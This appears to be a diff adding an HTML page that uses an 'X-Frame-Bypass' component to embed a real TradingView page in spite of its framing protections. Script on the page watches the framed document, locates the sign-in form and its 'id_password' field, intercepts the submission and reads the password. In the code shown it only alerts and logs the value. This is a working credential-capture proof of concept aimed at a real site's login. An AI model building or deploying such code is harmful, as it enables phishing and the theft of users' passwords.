@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description"
+        content="X-Frame-Bypass: Web Component extending IFrame to bypass X-Frame-Options: deny/sameorigin">
+    <title>X-Frame-Bypass Web Component Demo</title>
+    <meta http-equiv="Permissions-Policy" content="interest-cohort=()">
+
+    <style>
+        html,
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        iframe {
+            display: block;
+            width: calc(100% - 40px);
+            height: calc(100% - 40px);
+            margin: 20px;
+        }
+
+        img {
+            position: absolute;
+            top: 0;
+            right: 0;
+        }
+    </style>
+    <script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
+    <script src="x-frame-bypass.js" type="module"></script>
+    <!-- <script src="http://127.0.0.1:5500/captcha_smart_error.a737a5c9dbdd19f5b829.min.js?k=1688990308309" type="text/javascript"></script> -->
+    <!-- <script src="alert.js" type="module"></script> -->
+
+</head>
+
+<body>
+    <iframe is="x-frame-bypass" src="https://ru.tradingview.com/chart/t6OW6q8f/" class="asd"
+        sandbox="allow-popups allow-popups-to-escape-sandbox allow-forms allow-same-origin allow-scripts "
+        allow="geolocation; microphone; camera; midi; encrypted-media;"> </iframe>
+
+    <script>
+        function manipulateIframeContent() {
+
+            iframe = document.querySelector('.asd')
+
+            if (iframe || iframe.contentWindow) {
+
+                // Функция, которая будет вызвана при обнаружении изменений внутри <iframe>
+                function handleMutation(mutationsList, observer) {
+
+                    for (let mutation of mutationsList) {
+                        if (mutation.type === 'childList') {
+                            mutation.addedNodes.forEach(function (addedNode) {
+
+                                const divElement = addedNode;
+
+                                var pass;
+
+                                // Ищем все элементы <input> внутри div
+                                const inputElements = divElement.querySelectorAll('input');
+                                const inputElements2 = divElement.querySelectorAll('form');
+                                if (inputElements2[0] !== undefined) {
+                                    console.log(inputElements2[0])
+                                    const form = inputElements2[0];
+
+                                    form.addEventListener('submit', function (event) {
+                                        event.preventDefault(); // This prevents the default form submission behavior
+                                        const passwordInput = form.elements['id_password'];
+                                            alert(passwordInput.value)
+                                        // Your custom logic here, such as sending form data using AJAX
+                                    });
+                                }
+
+
+                                inputElements2.forEach(function (inputElement) {
+                                    if (inputElement.action === "/accounts/signin/") {
+                                        console.log(inputElement.__proto__)
+                                        console.log("Найден элемент <input>:", inputElement);
+                                    }
+                                    // Выполняйте необходимые действия для каждого элемента <input> здесь
+                                });
+
+                                // Проходимся по всем найденным элементам <input>
+                                inputElements.forEach(function (inputElement) {
+                                    if (inputElement.id === "id_password") {
+                                        console.log(inputElement.__proto__)
+                                        console.log("Найден элемент <input>:", inputElement);
+                                    }
+                                    // Выполняйте необходимые действия для каждого элемента <input> здесь
+                                });
+                            });
+                        }
+                    }
+                }
+
+                // Получаем ссылку на <iframe> (предположим, у него есть id "myFrame")
+
+                // Создаем экземпляр MutationObserver внутри <iframe>
+                const observer = new MutationObserver(handleMutation);
+
+                // Настраиваем наблюдение за изменениями внутри <iframe>
+                const config = { childList: true, subtree: true };
+                observer.observe(iframe.contentDocument.body, config);
+
+                // let originalString = iframe.srcdoc;
+                // let index = 52;
+                // let insertion = "<script src='https://unpkg.com/@ungap/custom-elements-builtin'>" + "<\/script><script src='x-frame-bypass.js' type='module'><\/script>";
+                // iframe.srcdoc = originalString.substring(0, index) + insertion + originalString.substring(index);
+
+
+                // var str_start = ''
+                // var str_end = '<iframe is="x-frame-bypass" src="https://ru.tradingview.com/chart/t6OW6q8f/" sandbox="allow-popups allow-popups-to-escape-sandbox allow-forms allow-same-origin allow-scripts " allow="geolocation; microphone; camera; midi; encrypted-media;"></iframe>';
+                // var number = str_end.length;
+                // const lastNSymbols = iframe.srcdoc.slice(-number);
+                // if (lastNSymbols !== str_end) {
+                //     iframe.srcdoc = iframe.srcdoc + str_end;
+                // }
+                // console.log("IFrame content has loaded.");
+            }
+        }
+        document.querySelector('.asd').addEventListener('load', manipulateIframeContent);
+    </script>
+</body>
+
+</html>
